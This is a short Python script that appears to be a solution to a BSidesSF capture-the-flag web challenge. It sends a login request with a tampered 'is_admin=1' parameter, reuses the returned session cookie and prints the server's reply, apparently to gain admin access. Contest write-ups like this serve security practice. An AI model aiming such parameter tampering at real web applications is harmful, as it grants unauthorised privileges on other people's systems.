#!/usr/bin/env python
import requests

url = 'https://mixer-f3834380.challenges.bsidessf.net/?action=login&first_name=Pedro&last_name=Dias&is_admin=1'

s = requests.Session()
s.get(url)
userCookie = s.cookies['user']
print userCookie

cookiesDict = dict(user=userCookie)

r = s.get(url, cookies=cookiesDict)

#print s.cookies
print r.text

s.close()
